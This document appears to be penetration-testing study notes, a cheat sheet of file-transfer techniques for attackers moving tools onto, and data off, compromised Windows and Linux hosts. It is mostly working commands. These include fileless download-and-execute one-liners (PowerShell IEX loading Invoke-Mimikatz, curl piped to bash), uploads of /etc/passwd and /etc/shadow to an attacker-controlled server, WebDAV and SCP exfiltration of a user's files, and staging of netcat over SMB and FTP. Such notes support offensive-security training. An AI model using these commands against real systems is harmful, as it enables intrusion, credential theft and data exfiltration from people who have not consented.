# File Transfers

1. [Windows File Transfer Methods](#windows-file-transfer-methods)
1. [Linux File Transfer Methods](#linux-file-transfer-methods)
1. [Transferring Files with Code](#transferring-files-with-code)

## Windows File Transfer Methods

* Download operations: (download to Windows)

  * PowerShell base64 encode & decode:

    * We can encode a file to a base64 string, copy its contents from terminal & perform the reverse operation.

    * To ensure the file is correct, we can use ```md5sum``` to verify the checksum.

    ```shell
    md5sum id_rsa
    # md5 hash of sample ssh key
    # we want to transfer sample ssh key to target Windows machine

    cat id_rsa | base64 -w 0; echo
    # copy this content and paste into PowerShell terminal
    ```

    ```ps
    [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64-encoded string>"))
    # decodes and writes to file

    Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
    # confirm hashes match
    ```

  * PowerShell web downloads:

    * In any version of PowerShell, the ```System.Net.WebClient``` class can be used to download a file over HTTP, HTTPS or FTP - there are [multiple WebClient methods](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0).

    ```ps
    (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

    # DownloadFileAsync can be used alternatively
    (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')
    ```

    ```ps
    # fileless method
    # using inbuilt function to download payload and execute it

    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
    # instead of downloading script to disk
    # runs it directly in memory using Invoke-Expression or IEX
    # IEX also accepts pipeline input
    ```

    ```ps
    # Invoke-WebRequest cmdlet can be used
    # aliases - iwr, curl, wget

    Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

    # can be piped with IEX for fileless
    Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 | IEX

    # if we get an Internet Explorer error, IWR should have -UseBasicParsing flag

    # for SSL/TLS errors, run this command
    # [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
    ```

  * SMB downloads:

    ```shell
    # on attacker machine
    # host SMB server
    sudo impacket-smbserver share -smb2support /tmp/smbshare

    # sometimes, unauthenticated guest access is blocked on Windows
    # so we need to use creds
    sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
    ```

    ```cmd
    # in target Windows machine
    # to copy file from SMB server
    copy \\192.168.220.133\share\nc.exe

    # if we are using creds, mount SMB server & copy
    net use n: \\192.168.220.133\share /user:test test
    copy n:\nc.exe
    ```

  * FTP downloads:

    ```shell
    # on attacker machine
    sudo pip3 install pyftpdlib

    # setup python3 ftp server
    sudo python3 -m pyftpdlib --port 21
    ```

    ```ps
    # on target machine
    (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
    ```

    ```cmd
    # if we do not have an interactive shell
    # we can create an FTP command file to download a file

    echo open 192.168.49.128 > ftpcommand.txt
    echo USER anonymous >> ftpcommand.txt
    echo binary >> ftpcommand.txt
    echo GET file.txt >> ftpcommand.txt
    echo bye >> ftpcommand.txt
    ftp -v -n -s:ftpcommand.txt
    # this downloads the file
    ```

* Upload operations: (upload from Windows)

  * PowerShell base64 encode & decode:

    ```ps
    [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
    # encode file to base64

    Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
    # get md5 hash
    ```

    ```shell
    # in attacker machine
    echo <base64 string> | base64 -d > hosts
    # decode base64 string and store in file

    md5sum hosts
    # hash should match
    ```
  
  * PowerShell web uploads:

    ```shell
    pip3 install uploadserver

    python3 -m uploadserver
    # webserver that hosts a file upload page
    ```

    ```ps
    # we can make use of PSUpload.ps1 script
    # use IWR for upload
    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

    Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
    # uploads file
    ```

  * PowerShell base64 web upload:

    ```ps
    $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
    # base64-encoding of file
    
    Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
    # send it on attacker machine port
    ```

    ```shell
    nc -lvnp 8000
    # catch the base64 data

    echo <base64 string> | base64 -d -w 0 > hosts
    ```

  * SMB uploads:

    ```shell
    # enterprises usually do not allow SMB protocol out of internal network
    # so we would need to use SMB over HTTP with WebDAV

    # setup WebDAV in attacker machine
    sudo pip install wsgidav cheroot

    sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
    ```

    ```cmd
    # connect to webDAV share
    dir \\192.168.49.128\DavWWWRoot
    # this folder does not actually exist on the attacker machine
    # it is a keyword recognized by Windows Shell to connect to root of webDAV server
    # we can alternatively mention an existing folder

    copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
    copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
    # upload files
    ```

  * FTP uploads:

    ```shell
    sudo python3 -m pyftpdlib --port 21 --write
    # start ftp server with --write
    # to allow clients to upload files
    ```

    ```ps
    (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
    # upload file
    ```

    ```cmd
    # we can also create a command file for client
    echo open 192.168.49.128 > ftpcommand.txt
    echo USER anonymous >> ftpcommand.txt
    echo binary >> ftpcommand.txt
    echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
    echo bye >> ftpcommand.txt
    ftp -v -n -s:ftpcommand.txt
    ```

## Linux File Transfer Methods

* Download operations: (download to Linux)

  * Base64 encoding/decoding:

    ```shell
    # on attacker machine
    md5sum id_rsa

    cat id_rsa | base64 -w 0; echo
    # encode to base64
    ```

    ```shell
    # on target machine
    echo -n "<base64-encoded string>" | base64 -d > id_rsa
    # decode file

    md5sum id_rsa
    # confirm hashes match
    ```
  
  * Web downloads with ```wget``` and ```curl```:

    ```shell
    wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
    # download using wget

    curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
    # download using curl
    ```

  * Fileless attacks:

    ```shell
    curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
    # fileless download with curl

    wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
    # fileless download with wget
    ```

  * Download with Bash (```/dev/tcp```):

    ```shell
    exec 3<>/dev/tcp/10.10.10.32/80
    # connect to target webserver

    echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
    # HTTP GET request

    cat <&3
    # print the response
    ```

  * SSH downloads:

    ```shell
    # on attacker machine
    sudo systemctl enable ssh

    sudo systemctl start ssh
    # setup and start ssh server

    netstat -lnpt
    # check for ssh listening port
    ```

    ```shell
    # on target machine
    # use scp utility
    scp plaintext@192.168.49.128:/root/myroot.txt .
    ```

* Upload operations (upload from Linux):

  * Web upload:

    ```shell
    # on attacker machine
    sudo python3 -m pip install --user uploadserver

    openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
    # generate self-signed cert

    mkdir https && cd https

    sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
    # this starts the server
    ```

    ```shell
    # on target machine
    curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
    # upload multiple files
    # --insecure flag used for self-signed cert
    ```
  
  * Alternative web file transfer:

    ```shell
    # on target machine
    # multiple ways to start a web server
    # depending on whatever language is setup on target

    python3 -m http.server

    python2.7 -m SimpleHTTPServer

    php -S 0.0.0.0:8000

    ruby -run -ehttpd . -p8000
    ```

    ```shell
    # download file to attacker machine
    wget 192.168.49.128:8000/filetotransfer.txt
    ```

  * SCP upload:

    ```shell
    # on target machine
    # if outbound SSH connection is allowed
    scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
    ```

## Transferring Files with Code

* Python:

  ```shell
  # python 2
  python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

  # python 3
  python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
  ```

  ```shell
  # to upload using python3
  # on attacker machine
  python3 -m uploadserver

  # on target machine
  python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd", "rb")})'
  ```

* PHP:

  ```shell
  # using file_get_contents() and file_put_contents()
  php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
  # -r is used to run one-liners

  # alternatively, we can use fopen()
  php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

  # we can download a file and pipe it to bash
  # @file works if fopen wrappers are enabled
  php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
  ```

* Ruby:

  ```shell
  # -e for one-liners
  ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
  ```

* Perl:

  ```shell
  perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
  ```

* JavaScript:

  ```js
  var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
  WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
  WinHttpReq.Send();
  BinStream = new ActiveXObject("ADODB.Stream");
  BinStream.Type = 1;
  BinStream.Open();
  BinStream.Write(WinHttpReq.ResponseBody);
  BinStream.SaveToFile(WScript.Arguments(1));

  // save this script as wget.js
  ```

  ```shell
  # to download file
  cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
  ```

* VBScript:

  ```vbscript
  dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
  dim bStrm: Set bStrm = createobject("Adodb.Stream")
  xHttp.Open "GET", WScript.Arguments.Item(0), False
  xHttp.Send

  with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
  end with
  ```

  ```shell
  # download file
  cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
  ```
